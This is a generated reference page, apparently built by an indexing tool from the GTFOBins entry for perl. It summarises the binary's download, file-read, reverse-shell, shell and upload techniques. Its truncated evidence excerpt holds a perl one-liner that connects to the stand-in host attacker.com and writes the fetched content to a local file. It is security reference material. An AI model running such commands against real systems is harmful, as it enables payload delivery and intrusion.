---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# perl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `perl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for perl covering download, file-read, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/perl.md)
- Source verification: [source record](../../sources/gtfobins/perl.md)

## Aliases

- `perl`

## Source Verification

[source record](../../sources/gtfobins/perl.md)

## Evidence Excerpt

```text
_body: ''
_name: perl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/perl
functions:
download:
- code: 'perl -MIO::Socket::INET -e ''$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die;
print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my
$fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_
```
